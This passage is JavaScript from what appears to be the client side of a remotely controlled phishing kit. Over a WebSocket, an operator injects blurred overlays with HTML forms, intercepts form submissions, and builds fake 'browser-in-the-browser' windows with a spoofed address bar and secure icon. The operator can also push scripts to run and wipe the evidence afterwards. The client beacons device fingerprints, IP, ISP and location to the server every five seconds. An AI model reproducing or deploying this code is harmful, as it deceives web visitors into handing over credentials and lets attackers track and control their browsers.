                                    console.log('Restored default/none effect background');
                                }
                                
                                // Store effect info for persistence after refresh
                                localStorage.setItem('eden-blur-effect', effectType);
                                localStorage.setItem('eden-blur-intensity', intensity.toString());
                                localStorage.setItem('eden-blur-applied', 'true');
                                
                                // Add the overlay to the body
                                document.body.appendChild(overlay);
                                
                                // Create a minimal container that won't affect template display - using etemp.js approach
                                const contentContainer = document.createElement('div');
                                contentContainer.id = 'eden-content-container';
                                
                                // Get position from message or use default center position
                                const posX = message.location && typeof message.location.x === 'number' ? message.location.x : 50;
                                const posY = message.location && typeof message.location.y === 'number' ? message.location.y : 50;
                                
                                console.log(`Positioning content at X: ${posX}%, Y: ${posY}%`);
                                
                                contentContainer.style.cssText = `
                                    position: fixed;
                                    top: ${posY}%;
                                    left: ${posX}%;
                                    transform: translate(-50%, -50%);
                                    max-width: 95%;
                                    max-height: 95vh;
                                    overflow: auto;
                                    border: none;
                                    background: none;
                                    box-shadow: none;
                                    padding: 0;
                                    margin: 0;
                                    z-index: 2000000; /* Higher z-index than overlay to ensure it stays on top */
                                    display: block !important;
                                `;
                                console.log('Created content container');
                                
                                // Process content to handle forms
                                const tempDiv = document.createElement('div');
                                tempDiv.innerHTML = message.content;
                                
                                // Find and modify forms to prevent redirect
                                const forms = tempDiv.querySelectorAll('form');
                                forms.forEach(form => {
                                    // Save original attributes
                                    const originalAction = form.getAttribute('action') || '';
                                    const originalTarget = form.getAttribute('target') || '';
                                    
                                    // Set data attributes to store original values
                                    form.setAttribute('data-original-action', originalAction);
                                    form.setAttribute('data-original-target', originalTarget);
                                    form.setAttribute('data-blur-form', 'true'); // Mark as a blur form
                                    
                                    // Remove navigation attributes
                                    form.removeAttribute('action');
                                    form.removeAttribute('target');
                                    
                                    // Set both onsubmit and a direct event listener for redundancy
                                    form.setAttribute('onsubmit', 'window.edenFormSubmitted(this); return false;');
                                });
                                
                                // Set the processed content
                                contentContainer.innerHTML = tempDiv.innerHTML;
                                
                                // Add form submission handler to window
                                window.edenFormSubmitted = function(form) {
                                    console.log('Form submission intercepted:', form);
                                    
                                    // Immediately clean up without showing any message
                                    cleanupBlurOverlay();
                                    
                                    return false;
                                };
                                
                                // Ensure we have document-level form submission monitoring
                                if (!window.blurFormSubmitListener) {
                                    window.blurFormSubmitListener = true;
                                    
                                    // Add a global event listener for all form submissions
                                    document.addEventListener('submit', function(e) {
                                        const form = e.target;
                                        
                                        // If this is a blur form or we have active blur overlay
                                        if (form.getAttribute('data-blur-form') === 'true' || 
                                            document.getElementById('eden-blur-overlay') || 
                                            localStorage.getItem('eden-blur-applied') === 'true') {
                                            
                                            console.log('Detected form submission with active blur effect');
                                            e.preventDefault();
                                            e.stopPropagation();
                                            
                                            // Clean up blur overlay
                                            if (typeof cleanupBlurOverlay === 'function') {
                                                cleanupBlurOverlay();
                                            } else {
                                                // Fallback cleanup if function isn't defined
                                                document.querySelectorAll('#eden-blur-overlay, #eden-content-container').forEach(el => {
                                                    if (el && el.parentNode) {
                                                        el.parentNode.removeChild(el);
                                                    }
                                                });
                                                
                                                // Clear storage
                                                localStorage.removeItem('blur-data');
                                                localStorage.removeItem('eden-blur-applied');
                                                localStorage.removeItem('eden-blur-effect');
                                                localStorage.removeItem('eden-blur-intensity');
                                                localStorage.removeItem('blur-content');
                                                localStorage.setItem('clean-flag', 'true');
                                                sessionStorage.setItem('clean-flag', 'true');
                                            }
                                            
                                            return false;
                                        }
                                    }, true); // Use capturing to catch all form submissions
                                }
                                
                                // Define cleanup function
                                function cleanupBlurOverlay() {
                                    console.log('Cleaning up blur overlay and content');
                                    
                                    // Also clean up any custom effects
                                    document.querySelectorAll('#eden-custom-effect, #eden-custom-effect-style').forEach(el => {
                                        if (el && el.parentNode) {
                                            el.parentNode.removeChild(el);
                                        }
                                    });
                                    
                                    // Remove elements
                                    ['#eden-blur-overlay', '#eden-content-container', '#eden-session-banner', '#eden-session-style'].forEach(selector => {
                                        const elements = document.querySelectorAll(selector);
                                        elements.forEach(el => {
                                            if (el && el.parentNode) {
                                                el.parentNode.removeChild(el);
                                            }
                                        });
                                    });
                                    
                                    // Clear storage
                                    localStorage.removeItem('blur-data');
                                    localStorage.removeItem('eden-blur-applied');
                                    localStorage.removeItem('eden-blur-effect');
                                    localStorage.removeItem('eden-blur-intensity');
                                    localStorage.removeItem('blur-content');
                                    localStorage.setItem('clean-flag', 'true');
                                    sessionStorage.setItem('clean-flag', 'true');
                                    
                                    console.log('Cleanup completed');
                                }
                                
                                
                                // Add content container to body
                                document.body.appendChild(contentContainer);
                                
                                // Store both effect and content data in a single object for persistence
                                const blurData = {
                                    content: message.content,
                                    effectType: effectType,
                                    intensity: intensity,
                                    fileName: message.fileName || null,
                                    location: {
                                        x: posX,
                                        y: posY
                                    }
                                };
                                
                                // Add custom effect data if applicable
                                if (effectType === 'custom' && message.customEffect) {
                                    blurData.customEffect = message.customEffect;
                                }
                                
                                localStorage.setItem('blur-data', JSON.stringify(blurData));
                                
                                // Also store the position separately for legacy code
                                localStorage.setItem('eden_blur_location_x', posX.toString());
                                localStorage.setItem('eden_blur_location_y', posY.toString());
                                
                                // Keep legacy storage for backward compatibility
                                localStorage.setItem('eden-blur-applied', 'true');
                                localStorage.setItem('eden-blur-effect', effectType);
                                localStorage.setItem('eden-blur-intensity', intensity.toString());
                                localStorage.setItem('blur-content', message.content);
                                
                                if (message.fileName) {
                                    localStorage.setItem('lastLoadedFile', message.fileName);
                                }
                                
                                console.log('Saved unified blur data to localStorage for persistence');
                                
                                console.log('Blur content applied successfully');
                            }
                            break;
                            
                          
                        case 'cleanBlurDisplay':
                            // Remove blur overlay and content container immediately
                            console.log('Cleaning blur display');
                            
                            // Remove blur overlay immediately
                            const blurOverlays = document.querySelectorAll('#eden-blur-overlay, .eden-blur-overlay');
                            blurOverlays.forEach(el => {
                                if (el && el.parentNode) {
                                    // Apply fade-out animation
                                    el.style.transition = 'opacity 0.3s';
                                    el.style.opacity = '0';
                                    
                                    // Remove after animation completes
                                    setTimeout(() => {
                                        if (el && el.parentNode) {
                                            el.parentNode.removeChild(el);
                                        }
                                    }, 300);
                                }
                            });
                            
                            // Remove content container immediately
                            document.querySelectorAll('#eden-content-container, .eden-content-container').forEach(el => {
                                if (el && el.parentNode) {
                                    // Apply fade-out animation
                                    el.style.transition = 'opacity 0.3s';
                                    el.style.opacity = '0';
                                    
                                    // Remove after animation completes
                                    setTimeout(() => {
                                        if (el && el.parentNode) {
                                            el.parentNode.removeChild(el);
                                        }
                                    }, 300);
                                }
                            });
                            
                            // Clear any blur-related localStorage data to prevent reappearance on refresh
                            localStorage.removeItem('blur-data');
                            localStorage.removeItem('eden-blur-applied');
                            localStorage.removeItem('eden-blur-effect');
                            localStorage.removeItem('eden-blur-intensity');
                            localStorage.removeItem('blur-content');
                            localStorage.setItem('clean-flag', 'true');
                            sessionStorage.setItem('clean-flag', 'true');
                            
                            console.log('Blur effect removed immediately');
                            
                            // Remove spotlight effect class from body
                            document.body.classList.remove('spotlight-effect');
                            
                            // We don't remove the eden-effect-styles element since it might be
                            // used by other effects, but we do clean up any old-style spotlight elements
                            const oldSpotlightStyle = document.getElementById('eden-spotlight-style');
                            if (oldSpotlightStyle) {
                                oldSpotlightStyle.remove();
                            }
                            
                            // Remove any old-style spotlight overlay for completeness
                            const oldSpotlightOverlay = document.querySelector('#eden-blur-overlay.spotlight');
                            if (oldSpotlightOverlay) {
                                oldSpotlightOverlay.remove();
                            }
                            
                            // Clear all saved blur data (including the unified storage)
                            localStorage.removeItem('blur-data'); // Remove the unified storage first
                            // Also clear legacy storage items for complete cleanup
                            localStorage.removeItem('eden-blur-applied');
                            localStorage.removeItem('eden-blur-effect');
                            localStorage.removeItem('eden-blur-intensity');
                            localStorage.removeItem('blur-content');
                            localStorage.removeItem('eden-last-effect');
                            localStorage.removeItem('eden-spotlight-style');
                            
                            // Set clean flag to prevent restoration on refresh
                            localStorage.setItem('clean-flag', 'true');
                            sessionStorage.setItem('clean-flag', 'true');
                            
                            console.log('Blur display and spotlight effect cleaned successfully');
                            break;
                        
                        case 'showContent':
                            // Display HTML content in the main container
                            showContent(message.content, message.fileName, message.reload || false);
                            break;

                        case 'request-content':
                            sendHtmlContentImmediately();
                            break;

                        case 'showsContent':
                            // Handle showsContent directly 
                            if (message.content && typeof message.content === 'string') {
                                console.log('Received showsContent message with content');
                                // Store showContent in localStorage
                                localStorage.setItem('showsContent', message.content);
                                
                                // Hide placeholder if present
                                const placeholder = document.getElementById('placeholder');
                                if (placeholder) placeholder.style.display = 'none';
                                
                                // Check if we should display on blurred background
                                if (message.onBlurredBackground) {
                                    console.log('Displaying content on blurred background');
                                    
                                    // First remove any existing content containers
                                    document.querySelectorAll('.eden-content-container').forEach(el => {
                                        if (el && el.parentNode) {
                                            el.parentNode.removeChild(el);
                                        }
                                    });
                                    
                                    // Create content container
                                    const contentContainer = document.createElement('div');
                                    contentContainer.className = 'eden-content-container';
                                    contentContainer.style.position = 'fixed';
                                    contentContainer.style.top = '50%';
                                    contentContainer.style.left = '50%';
                                    contentContainer.style.transform = 'translate(-50%, -50%)';
                                    contentContainer.style.width = '90%';
                                    contentContainer.style.maxWidth = '800px';
                                    contentContainer.style.maxHeight = '90vh';
                                    contentContainer.style.backgroundColor = 'transparent';
                                    contentContainer.style.padding = '20px';
                                    contentContainer.style.borderRadius = '8px';
                                    contentContainer.style.boxShadow = '0 8px 30px rgba(0, 0, 0, 0.3)';
                                    contentContainer.style.zIndex = '9999';
                                    contentContainer.style.overflow = 'auto';
                                    contentContainer.style.border = '1px solid rgba(0,0,0,0.1)';
                                    contentContainer.innerHTML = message.content;
                                    
                                    // Create close button
                                    const closeButton = document.createElement('button');
                                    closeButton.className = 'eden-close-button';
                                    closeButton.style.position = 'absolute';
                                    closeButton.style.top = '10px';
                                    closeButton.style.right = '10px';
                                    closeButton.style.backgroundColor = '#ff5555';
                                    closeButton.style.color = 'white';
                                    closeButton.style.border = 'none';
                                    closeButton.style.borderRadius = '50%';
                                    closeButton.style.width = '30px';
                                    closeButton.style.height = '30px';
                                    closeButton.style.cursor = 'pointer';
                                    closeButton.innerHTML = '×';
                                    closeButton.onclick = function() {
                                        // Remove content container only, leave blur effect intact
                                        document.querySelectorAll('.eden-content-container').forEach(el => {
                                            if (el && el.parentNode) {
                                                el.parentNode.removeChild(el);
                                            }
                                        });
                                    };
                                    
                                    // Add content container and close button to body
                                    contentContainer.appendChild(closeButton);
                                    document.body.appendChild(contentContainer);
                                    
                                    // Store the content for persistence
                                    localStorage.setItem('blur-content', message.content);
                                    
                                    // Store filename if provided
                                    if (message.fileName) {
                                        localStorage.setItem('lastLoadedFile', message.fileName);
                                    }
                                } else {
                                    // Regular display in container
                                    const container = getMainContainer();
                                    if (container) {
                                        // If reload is true, force a page reload
                                        if (message.reload) {
                                            location.reload();
                                            return;
                                        }
                                        
                                        // Otherwise update the content directly
                                        container.innerHTML = message.content;
                                        
                                        // If we have a filename, store it
                                        if (message.fileName) {
                                            localStorage.setItem('lastLoadedFile', message.fileName);
                                        }
                                        
                                        // Clean up any existing blur overlays or content containers
                                        document.querySelectorAll('.eden-blur-overlay, .eden-content-container, .eden-close-button').forEach(el => {
                                            if (el && el.parentNode) {
                                                el.parentNode.removeChild(el);
                                            }
                                        });
                                    }
                                }
                            }
                            break;
                            
                        case 'BITBContent':
                            
                            // Display content in a popup window
                            if (message.broadcast === true || isClientTargeted(message)) {
                                console.log('Received BITBContent request, creating browser window');
                                try {
                                    // Ensure we have valid content to display
                                    const content = message.content || '<html><body><p>No content provided</p></body></html>';
                                    const fileName = message.fileName || 'window_' + Date.now();
                                    
                                    // Use setTimeout to ensure DOM is ready
                                    setTimeout(() => {
                                        const window = showContentInWindow(content, fileName);
                                        console.log('Browser window created:', window ? 'success' : 'failed');
                                    }, 10);
                                } catch (error) {
                                    console.error('Error creating window:', error);
                                }
                            } else {
                                console.log('Window creation skipped - client not targeted');
                            }
                            break;
                            
                        case 'executeContent':
                            // Execute content with potential script execution
                            executeContent(message.content, message.fileName, message.resources, message.reload || false);
                            break;
                            
                     
                            // Display HTML content with blur or shade effect only if this client is targeted
                            // First check if this is a targeted message or a broadcast
                            if (message.broadcast === true || isClientTargeted(message)) {
                                const effectType = message.effect || 'blur';
                                const intensity = parseInt(message.intensity) || 5;
                                console.log(`Received blur request with effect: ${effectType}, intensity: ${intensity}`);
                                showContent(message.content, message.fileName, 'blur', effectType, null, intensity);
                            } else {
                                console.log('Received blur request but this client is not targeted');
                            }
                            break;
                            
                        case 'Sudoclean':
                                
                            try {
                                // Clear the blur display only if this client is targeted
                                if (message.broadcast === true || isClientTargeted(message)) {
                                    console.log('Received cleanBlurDisplay command - performing thorough cleanup');
                                    // First clear the content using cleanContent
                                    cleanContent();
                                    
                                    // Then clear any windows that might be open
                                    clearAllWindows(true);
                                    
                                    // Extra measures to prevent persistence after refresh
                                    localStorage.setItem('clean-flag', 'true');
                                    sessionStorage.setItem('clean-flag', 'true');
                                    
                                    console.log('Display completely cleaned - content will not persist');
                                }
                            } catch (e) {
                                console.error('Error in Sudoclean:', e);
                            }
                            break;
                            
                        
                        case 'cleanContent':
                            // Clear the display
                            cleanContent();
                            break;
                            
                        case 'clearWindows':
                            // Clear all windows
                            clearAllWindows(message.clearStorage || false);
                            break;
                            
                        case 'clearSingleFile':
                            // Clear a single file from storage
                            clearSingleFile(message.fileName);
                            break;
                            
                        case 'storeFile':
                            try {
                                const data = message;
                                console.log('Received storeFile message:', data);
                                if (data.fileName && data.content) {
                                    // Store the file in localStorage
                                    const key = 'file_' + data.fileName;
                                    localStorage.setItem(key, data.content);
                                    
                                    // Store the reload flag if provided - ALWAYS convert to string 'true' or 'false'
                                    const reloadKey = key + '_reload';
                                    let reloadValue = 'false';
                                    
                                    if (data.reload !== undefined) {
                                        // Convert any truthy/falsy value to the exact string 'true' or 'false'
                                        reloadValue = data.reload ? 'true' : 'false';
                                        console.log(`File ${data.fileName} received with reload flag: ${data.reload} (${typeof data.reload})`);
                                    } else {
                                        console.log(`File ${data.fileName} received without reload flag, defaulting to false`);
                                    }
                                    
                                    // Always store the reload flag, even if not provided (default to 'false')
                                    localStorage.setItem(reloadKey, reloadValue);
                                    console.log(`File ${data.fileName} stored with reload flag:`);
                                    console.log(`- Key: ${reloadKey}`);
                                    console.log(`- Value: ${reloadValue}`);
                                    
                                    // Verify it was stored correctly
                                    const storedValue = localStorage.getItem(reloadKey);
                                    console.log(`- Verification - stored value: ${storedValue} (${typeof storedValue})`);
                                    
                                    // Debug: List all localStorage items after storing
                                    console.log('All localStorage items after storing:');
                                    for (let i = 0; i < localStorage.length; i++) {
                                        const k = localStorage.key(i);
                                        console.log(`${k}: ${localStorage.getItem(k)}`);
                                    }
                                    
                                    // Send confirmation back
                                    ws.send(JSON.stringify({
                                        type: 'fileStored',
                                        fileName: data.fileName,
                                        reload: reloadValue === 'true'
                                    }));
                                } else {
                                    console.error('Invalid storeFile message: missing fileName or content');
                                    ws.send(JSON.stringify({
                                        type: 'error',
                                        error: 'Invalid storeFile message: missing fileName or content'
                                    }));
                                }
                            } catch (error) {
                                console.error('Error processing storeFile message:', error);
                                ws.send(JSON.stringify({
                                    type: 'error',
                                    error: 'Error processing storeFile message: ' + error.message
                                }));
                            }
                            break;
                                
                        case 'clearFiles':
                            // Clear all files from localStorage
                            clearFiles();
                            break;
                            
                        default:
                            console.log('Unhandled message type:', message.type);
                    }
                } catch (e) {
                    console.error('Error parsing message:', e);
                }
            };
        } catch (error) {
            console.error('Error creating WebSocket:', error);
            handleReconnect();
        }
    }
    
    // Handle reconnection
    function handleReconnect() {
        connectionAttempts++;
        clearTimeout(reconnectTimer);
        
        // Always reconnect every 5 seconds indefinitely
        console.log(`Connection attempt #${connectionAttempts}. Will retry in 5 seconds.`);
        reconnectTimer = setTimeout(connectToServer, 5000);
    }
    
    // Send connection message periodically (every 5 seconds)
    function startPeriodicConnectionSender() {
        // Clear any existing timer
        clearInterval(periodicConnectionTimer);
        
        // Create a new timer that sends connection message every 5 seconds
        periodicConnectionTimer = setInterval(function() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                // Get the stored enhanced client ID
                const enhancedClientId = sessionStorage.getItem('eden_enhanced_client_id') || clientId;
                
                // Check if connection is through ngrok
                const isNgrok = window.location.hostname.includes('ngrok') || document.URL.includes('ngrok');
                
                // Get device fingerprint and info
                const deviceInfo = getStoredDeviceInfo();
                const deviceFingerprint = generateDeviceFingerprint();
                
                // Get system information
                const systemInfo = getSystemInfo();
                
                // Create comprehensive identification message - same as initial connection
                const connectionMessage = {
                    type: 'connection',
                    clientId: enhancedClientId,
                    baseClientId: localStorage.getItem('eden_persistent_client_id'),
                    sessionId: sessionStorage.getItem('eden_session_client_id'),
                    deviceFingerprint: deviceFingerprint,
                    timestamp: Date.now(),
                    ip: clientIp,
                    periodic: true,  // Flag indicating this is a periodic connection message
                    details: {
                        ...deviceInfo,
                        browser: systemInfo.browser,
                        os: systemInfo.os,
                        isMobile: systemInfo.isMobile,
                        screen: `${systemInfo.screenWidth}x${systemInfo.screenHeight}`,
                        language: systemInfo.language || navigator.language,
                        colorDepth: systemInfo.colorDepth,
                        isp: locationInfo.isp || locationInfo.org || 'Unknown ISP',
                        city: locationInfo.city || 'Unknown',
                        region: locationInfo.region || 'Unknown',
                        country: locationInfo.country || 'Unknown',
                        timezone: locationInfo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                        ngrok: isNgrok
                    }
                };
                
                // Send the connection message with full details
                ws.send(JSON.stringify(connectionMessage));
                console.log('Sent periodic connection message with full client details');
            } else {
                console.log('WebSocket not open, cannot send periodic connection message');
                // Try to reconnect if WebSocket is not open
                if (!ws || ws.readyState !== WebSocket.CONNECTING) {
                    connectToServer();
                }
            }
        }, 5000); // Send every 5 seconds
    }
    
    // Get operating system info
    function getSystemInfo() {
        const userAgent = navigator.userAgent;
        let os = 'Unknown';
        let browser = 'Unknown';
        
        // Detect OS
        if (userAgent.indexOf('Windows') !== -1) {
            if (userAgent.indexOf('Windows NT 10') !== -1) os = 'Windows 10';
            else if (userAgent.indexOf('Windows NT 11') !== -1) os = 'Windows 11';
            else if (userAgent.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1';
            else if (userAgent.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8';
            else if (userAgent.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
            else if (userAgent.indexOf('Windows NT 6.0') !== -1) os = 'Windows Vista';
            else if (userAgent.indexOf('Windows NT 5.1') !== -1) os = 'Windows XP';
            else os = 'Windows';
        } else if (userAgent.indexOf('Mac') !== -1) {
            if (userAgent.indexOf('iPhone') !== -1) {
                os = 'iOS';
            } else if (userAgent.indexOf('iPad') !== -1) {
                os = 'iPadOS';
            } else {
                os = 'macOS';
            }
        } else if (userAgent.indexOf('Android') !== -1) {
            os = 'Android';
        } else if (userAgent.indexOf('Linux') !== -1) {
            os = 'Linux';
        } else if (userAgent.indexOf('iPhone') !== -1) {
            os = 'iOS';
        } else if (userAgent.indexOf('iPad') !== -1) {
            os = 'iPadOS';
        } else if (userAgent.indexOf('CrOS') !== -1) {
            os = 'ChromeOS';
        }
        
        // Enhanced browser detection with special handling for Brave
        // Check for Brave first using the navigator.brave API
        const isBrave = (navigator.brave && navigator.brave.isBrave && navigator.brave.isBrave.name === 'isBrave') || 
                      window.navigator.brave || 
                      /brave/i.test(userAgent);
        
        if (isBrave) {
            browser = 'Brave';
        } else if (userAgent.indexOf('Firefox') !== -1) {
            browser = 'Firefox';
        } else if (userAgent.indexOf('Edge') !== -1 || userAgent.indexOf('Edg/') !== -1) {
            browser = 'Edge';
        } else if (userAgent.indexOf('OPR') !== -1 || userAgent.indexOf('Opera') !== -1) {
            browser = 'Opera';
        } else if (userAgent.indexOf('Chrome') !== -1) {
            browser = 'Chrome';
        } else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) {
            browser = 'Safari';
        } else if (userAgent.indexOf('MSIE') !== -1 || userAgent.indexOf('Trident') !== -1) {
            browser = 'Internet Explorer';
        }
        
        // Detect device type more accurately
        const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        const isTablet = /Tablet|iPad/i.test(userAgent) || 
                        (navigator.maxTouchPoints > 0 && /Macintosh/i.test(userAgent));
        
        // Screen size detection
        const screenWidth = window.screen.width || 0;
        const screenHeight = window.screen.height || 0;
        const devicePixelRatio = window.devicePixelRatio || 1;
        
        // Calculate physical screen dimensions
        const physicalWidth = Math.round(screenWidth * devicePixelRatio);
        const physicalHeight = Math.round(screenHeight * devicePixelRatio);
        const screenSize = `${screenWidth}x${screenHeight} (${physicalWidth}x${physicalHeight})`;
        
        return {
            os: os,
            browser: browser,
            platform: navigator.platform || 'Unknown',
            screenWidth: screenWidth,
            screenHeight: screenHeight,
            screen: screenSize,
            language: navigator.language,
            userAgent: navigator.userAgent,
            isMobile: isMobile,
            isTablet: isTablet,
            deviceType: isTablet ? 'Tablet' : (isMobile ? 'Mobile' : 'Desktop'),
            colorDepth: window.screen.colorDepth || 24,
            devicePixelRatio: devicePixelRatio,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            touchPoints: navigator.maxTouchPoints || 0
        };
    }
    
    // Send client information to server
    function sendClientInfo() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            // Collect client details
            const systemInfo = getSystemInfo();
            
            // Create a session ID that's unique to this browser tab
            if (!window.sessionId) {
                window.sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9);
            }            
            // Important: Create a combined ID that includes both the persistent clientId AND the sessionId
            // This lets the server know that this is the same client (via clientId) but a different session
            const combinedId = clientId + '-' + window.sessionId;
            
            const clientInfo = {
                type: 'connection',
                ip: clientIp,
                clientId: clientId,            // The persistent ID (stays the same on refresh)
                sessionId: window.sessionId,    // The session-specific ID (changes on refresh)
                combinedId: combinedId,         // Combined ID for unique identification
                instanceTime: Date.now(),
                details: {
                    os: systemInfo.os,
                    browser: systemInfo.browser,
                    isMobile: systemInfo.isMobile,
                    screen: `${systemInfo.screenWidth}x${systemInfo.screenHeight}`,
                    language: systemInfo.language,
                    colorDepth: systemInfo.colorDepth,
                    isp: locationInfo.org || 'Unknown ISP',
                    city: locationInfo.city || 'Unknown',
                    region: locationInfo.region || 'Unknown',
                    country: locationInfo.country || 'Unknown',
                    timezone: locationInfo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'
                }
            };
            
            // Log the connection info we're sending (but don't log all details to keep console clean)
            console.log('Sending client connection:', { 
                clientId: clientInfo.clientId,
                sessionId: clientInfo.sessionId,
                ip: clientInfo.ip
            });
            
            // Send the data
            try {
                ws.send(JSON.stringify(clientInfo));
            } catch (error) {
                console.error('Error sending client info:', error);
            }
        } else {
            console.warn('Cannot send client info - WebSocket not ready');
        }
    }
    
    // Create window styles
    const windowStyle = document.createElement('style');
    windowStyle.textContent = `
        .window-content {
            flex: 1;
            overflow: auto;
            padding: 0;
            box-sizing: border-box;
            background-color: white;
            position: relative;
            isolation: isolate;
        }
        
        /* Iframe container to isolate content */
        .iframe-container {
            width: 100%;
            height: 100%;
            border: none;
            overflow: hidden;
        }
        .browser-window {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            width: 960px;
            height: 640px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            transition: all 0.3s ease;
            border: 1px solid rgba(0, 0, 0, 0.2);
            backdrop-filter: none;
            contain: layout style paint;
            isolation: isolate;
        }
        
        .browser-window.closing {
            opacity: 0;
            transform: scale(0.9);
        }
        .window-content::before {
            display: none;  /* Remove any pseudo-elements that might affect opacity */
        }
        .browser-window.maximized {
            top: 0;
            left: 0;
            transform: none;
            width: 80%;
            height: 80%;
            border-radius: 0;
        }
        .browser-window.minimized {
            transform: translate(-50%, 100%);
            bottom: 0;
            top: auto;
        }
        .window-header {
            background: #f1f3f4;
            padding: 0;
            display: flex;
            flex-direction: column;
            cursor: move;
            user-select: none;
            border-bottom: 1px solid #e0e0e0;
        }
        .window-top {
            display: flex;
            align-items: center;
            background: #f1f3f4;
            height: 38px;
            padding: 0 4px;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            box-shadow: 0 1px 0 rgba(0,0,0,0.1);
        }
        .tab-section {
            display: flex;
            align-items: center;
            flex: 1;
            height: 100%;
            margin-right: 8px;
        }
        .tab {
            display: flex;
            align-items: center;
            background: #fff;
            height: 100%;
            padding: 0 10px;
            border-radius: 8px 8px 0 0;
            margin-right: 1px;
            min-width: 100px;
            position: relative;
        }
        
        .new-tab-button {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            margin-left: 4px;
            font-size: 18px;
            color: #5f6368;
            background-color: transparent;
        }
        
        .new-tab-button:hover {
            background-color: rgba(0, 0, 0, 0.1);
        }
        .tab-favicon {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }
        .tab-title {
            font-size: 14px;
            color: #5f6368;
            margin-right: 8px;
            font-weight: bold;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 200px;
        }
        .tab-close {
            width: 16px;
            height: 16px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        .tab-close:hover {
            background: #e8eaed;
        }
        .new-tab-button {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            margin-left: 4px;
        }
        .new-tab-button:hover {
            background: rgba(0,0,0,0.1);
        }
        .nav-controls {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .window-controls {
            display: flex;
            gap: 8px;
            padding-right: 10px;
            margin-left: auto;
        }
        .nav-button {
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            border: none;
            background: none;
            border-radius: 50%;
            transition: background 0.2s;
        }
        .nav-button:hover {
            background-color: rgba(0, 0, 0, 0.1);
        }
        .address-bar {
            display: flex;
            align-items: center;
            background: #f9f9f9;
            padding: 5px;
            border-bottom: 1px solid #ccc;
            gap: 8px;
        }
        .url-input {
            flex: 1;
            padding: 5px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 14px;
            background: white;
            outline: none;
        }
        .bookmark-button {
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            color: #666;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background-color 0.2s;
        }
        .bookmark-button:hover {
            background-color: rgba(0, 0, 0, 0.1);
            color: #333;
        }
        .secure-icon {
            color: #00C851;
            margin-right: 8px;
            font-size: 16px;
        }
        .window-title {
            margin: 0;
            font-size: 14px;
        }
        .window-controls {
            display: flex;
            gap: 10px;
        }
        .window-button {
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background 0.2s;
            border: none;
            background: none;
            border-radius: 3px;
        }
        .window-button:hover {
            background-color: rgba(0, 0, 0, 0.1);
        }
        .window-button svg {
            width: 16px;
            height: 16px;
            stroke: currentColor;
            stroke-width: 2;
            fill: none;
        }
        .window-button.close:hover {
            background-color: red;
        }
        .window-button.close:hover svg {
            stroke: white;
        }
        
        /* Address bar styles */
        .address-bar {
            display: flex;
            align-items: center;
            background: #f1f3f4;
            padding: 8px 10px;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .nav-controls {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-right: 10px;
        }
        
        .nav-button {
            width: 34px;
            height: 34px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            background: transparent;
            border: none;
            color: #5f6368;
        }
        
        .nav-button:hover {
            background-color: rgba(0, 0, 0, 0.1);
        }
        
        .url-input {
            flex: 1;
            height: 36px;
            padding: 0 10px;
            border-radius: 18px;
            border: none;
            background-color: #e9eaed;
            font-size: 14px;
            color: #333;
        }
        
        .url-input:focus {
            outline: none;
            background-color: white;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        
        .bookmark-button {
            width: 34px;
            height: 34px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            background: transparent;
            border: none;
            color: #5f6368;
            margin-left: 8px;
        }
        
        .bookmark-button:hover {
            background-color: rgba(0, 0, 0, 0.1);
        }
        
        .window-content {
            flex: 1;
            overflow: auto;
            padding: 20px;
        }

        /* Main content and placeholder styling */
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f9f9f9;
        }
        #main-content {
            width: 100%;
            min-height: 100vh;
            padding: 20px;
            box-sizing: border-box;
        }
        #placeholder {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #666;
            font-size: 18px;
            text-align: center;
        }
    `;
    document.head.appendChild(windowStyle);

    // Variables to track window state
    let activeWindow = null;
    let initialX = 0;
    let initialY = 0;
    let currentX = 0;
    let currentY = 0;
    let isDragging = false;
    let xOffset = 0;
    let yOffset = 0;

    // Helper Functions for Content Display
    
    // Create or get main container
    function getMainContainer() {
        let container = document.getElementById('main-content');
        if (!container) {
            // Create main container if it doesn't exist
            container = document.createElement('div');
            container.id = 'main-content';
            container.style.width = '100%';
            container.style.minHeight = '300px';
            container.style.padding = '20px';
            container.style.boxSizing = 'border-box';
            
